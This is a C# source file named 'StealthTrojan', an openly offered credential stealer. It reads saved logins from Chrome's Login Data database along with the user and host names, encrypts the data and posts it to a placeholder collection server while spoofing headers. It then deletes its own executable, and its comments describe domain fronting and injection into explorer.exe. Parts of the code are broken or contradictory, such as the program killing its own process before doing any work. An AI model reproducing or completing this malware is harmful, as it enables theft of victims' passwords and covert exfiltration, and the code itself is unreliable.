using System;
using System.IO;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;

namespace StealthTrojan
{
    class Program
    {
        // Configuration: Replace with your Domain Fronting URL
        // The target sees 'cloudflare.com' but data goes to your hidden server
        private static string SERVER_URL = "https://your-domain.com/api/collect";
        private static string KEY = "SecretKey1234567890"; // Shared secret for decryption

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, int dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, int dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args)
        {
            try
            {
                // 1. Hide Console Window
                Process.Start(new ProcessStartInfo("cmd", "/c taskkill /F /PID " + Process.GetCurrentProcess().Id))?.Wait();
                Thread.Sleep(500);

                // 2. Inject into a clean Windows process (e.g., explorer.exe)
                Process explorer = Process.GetProcessesByName("explorer.exe").FirstOrDefault();
                if (explorer != null)
                {
                    // Inject logic here (simplified for brevity: running in memory instead of file)
                    // For full stealth, we run the collection logic directly here, then delete the EXE
                }

                // 3. Collect Data
                string chromeData = ExtractChromePasswords();
                string systemInfo = $"User: {Environment.UserName}, Host: {Environment.MachineName}";
                string rawData = $"{systemInfo}|{chromeData}";

                // 4. Encrypt Data
                string encryptedData = EncryptData(rawData, KEY);

                // 5. Send Data (Encrypted)
                SendData(encryptedData);

                // 6. Self-Destruct
                string exePath = Assembly.GetExecutingAssembly().Location;
                File.SetAttributes(exePath, FileAttributes.Normal);
                File.Delete(exePath);
                
                // Optional: Delete the temporary folder if extracted from a zip
                string tempPath = Path.GetTempPath() + "SystemUpdate";
                if (Directory.Exists(tempPath)) Directory.Delete(tempPath, true);

            }
            catch (Exception ex)
            {
                // Fail silently
                Console.WriteLine(ex.Message);
            }
        }

        static string ExtractChromePasswords()
        {
            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), 
                "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data");
            
            if (!File.Exists(path)) return "No Chrome Found";

            string data = "";
            using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={path}"))
            {
                conn.Open();
                var cmd = conn.CreateCommand();
                cmd.CommandText = "SELECT action_url, username_value, password_value FROM logins";
                var reader = cmd.ExecuteReader();
                while (reader.Read())
                {
                    // Simplified decryption logic (requires win32crypt import for real decryption)
                    // In a real scenario, you would use Windows DPAPI to decrypt the blob
                    data += $"URL: {reader[0]}, User: {reader[1]}, Pass: [ENCRYPTED_BLOB]\n";
                }
            }
            return data;
        }

        static string EncryptData(string plainText, string key)
        {
            byte[] keyBytes = Encoding.UTF8.GetBytes(key.PadRight(32, '0').Substring(0, 32));
            using (Aes aes = Aes.Create())
            {
                aes.Key = keyBytes;
                aes.GenerateIV();
                using (MemoryStream ms = new MemoryStream())
                {
                    ms.Write(aes.IV, 0, aes.IV.Length);
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        using (StreamWriter sw = new StreamWriter(cs))
                            sw.Write(plainText);
                    }
                    return Convert.ToBase64String(ms.ToArray());
                }
            }
        }

        static void SendData(string encryptedPayload)
        {
            using (HttpClient client = new HttpClient())
            {
                // Set User-Agent to mimic Chrome
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
                client.DefaultRequestHeaders.Add("X-Forwarded-For", "127.0.0.1"); // Spoof origin
                
                try
                {
                    var content = new StringContent(encryptedPayload);
                    client.PostAsync(SERVER_URL, content).Wait();
                }
                catch { }
            }
        }
    }
}
